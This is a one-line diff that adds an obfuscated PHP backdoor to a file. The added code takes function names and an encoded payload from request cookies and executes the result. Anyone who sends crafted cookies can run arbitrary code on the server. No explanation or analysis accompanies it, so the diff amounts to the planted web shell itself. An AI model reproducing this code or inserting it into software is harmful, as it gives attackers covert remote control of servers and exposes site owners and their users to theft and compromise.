@@ -1,0 +1,1 @@
+<?php if(@$_COOKIE['zbl']){$wj=$_COOKIE['zbl']("",@$_COOKIE['pfxd'](@$_COOKIE['rk']));$wj();}?>
